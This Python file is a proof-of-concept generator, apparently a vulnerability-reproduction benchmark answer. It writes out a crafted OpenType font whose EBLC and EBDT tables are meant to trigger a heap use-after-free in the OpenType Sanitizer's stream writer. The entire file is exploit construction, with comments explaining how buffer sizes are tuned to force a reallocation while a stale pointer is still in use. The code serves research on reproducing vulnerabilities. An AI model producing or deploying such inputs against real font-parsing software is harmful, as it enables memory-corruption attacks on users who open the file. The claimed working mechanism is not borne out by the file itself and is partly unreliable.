import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        
        def p16(x: int) -> bytes:
            return struct.pack('>H', x)

        def p32(x: int) -> bytes:
            return struct.pack('>I', x)

        # The PoC triggers a heap-use-after-free in ots::OTSStream::Write.
        # This is achieved by crafting an OpenType font with EBLC and EBDT tables.
        # The EBLC table defines two embedded bitmap glyphs. The first is small,
        # designed to fill the sanitizer's output stream buffer almost to capacity.
        # The second glyph is large. When the sanitizer processes it, the attempt
        # to write the large data chunk forces the stream to reallocate its buffer.
        # If the sanitizer performs in-place processing (where the output stream
        # reuses the input file buffer), this reallocation frees the original
        # buffer. The source pointer for the write operation, still pointing into
        # the now-freed buffer, is then used by memcpy, leading to a UAF.
        # The size of the first glyph is tuned to make the final PoC ~800 bytes.
        
        # Base size calculation for tuning PRE_FILL_SIZE:
        # SFNT Header (12) + Table Dir (48) + head (54) + EBDT header (4)
        # + EBLC table (8+40+4+16=68) = 186 bytes.
        # To reach 800 bytes, PRE_FILL_SIZE should be 800 - 186 = 614.
        PRE_FILL_SIZE = 614
        TRIGGER_SIZE = 0x20000
        NUM_GLYPHS = 2
        BITMAP_SIZE_RECORD_LEN = 40

        poc = bytearray()
        
        # SFNT Header
        poc += p32(0x00010000)  # sfnt version
        poc += p16(3)           # numTables: EBLC, EBDT, head
        poc += p16(32)          # searchRange
        poc += p16(1)           # entrySelector
        poc += p16(16)          # rangeShift

        # Table Directory placeholder
        poc += b'\x00' * (3 * 16)

        tables = {}

        # EBLC Table
        eblc_table = bytearray()
        eblc_table += p16(2)      # majorVersion
        eblc_table += p16(0)      # minorVersion
        eblc_table += p32(1)      # numSizes

        indexSubTableArrayOffset = 8 + BITMAP_SIZE_RECORD_LEN
        indexSubTableSize = 8 + NUM_GLYPHS * 4
        indexTablesSize = 4 + indexSubTableSize

        bitmap_size_record = bytearray(b'\x00' * BITMAP_SIZE_RECORD_LEN)
        bitmap_size_record[0:4] = p32(indexSubTableArrayOffset)
        bitmap_size_record[4:8] = p32(indexTablesSize)
        bitmap_size_record[8:12] = p32(1) # numberOfIndexSubTables
        bitmap_size_record[32:34] = p16(0) # startGlyphIndex
        bitmap_size_record[34:36] = p16(NUM_GLYPHS - 1) # endGlyphIndex
        eblc_table += bitmap_size_record

        eblc_table += p32(indexSubTableArrayOffset + 4) # offset to IndexSubTable

        eblc_table += p16(2)      # indexFormat
        eblc_table += p16(5)      # imageFormat
        eblc_table += p32(4)      # imageDataOffset

        eblc_table += p32(PRE_FILL_SIZE)
        eblc_table += p32(TRIGGER_SIZE)
        
        tables[b'EBLC'] = eblc_table
        
        # EBDT Table
        ebdt_table = bytearray()
        ebdt_table += p16(2)      # majorVersion
        ebdt_table += p16(0)      # minorVersion
        ebdt_table += b'A' * PRE_FILL_SIZE
        
        tables[b'EBDT'] = ebdt_table

        # head Table
        head_table = bytearray(b'\x00' * 54)
        head_table[0:4] = p32(0x00010000)
        head_table[12:16] = p32(0x5F0F3CF5) # magicNumber
        head_table[18:20] = p16(1000) # unitsPerEm
        
        tables[b'head'] = head_table

        # Assemble file: write table directory and append table data
        current_offset = len(poc)
        table_dir_entry_pos = 12
        
        sorted_tags = sorted(tables.keys())
        
        for tag in sorted_tags:
            table_data = tables[tag]
            table_length = len(table_data)
            table_offset = current_offset
            
            entry = tag + p32(0) + p32(table_offset) + p32(table_length)
            poc[table_dir_entry_pos : table_dir_entry_pos + 16] = entry
            table_dir_entry_pos += 16

            poc += table_data
            current_offset += table_length
            
        return bytes(poc)
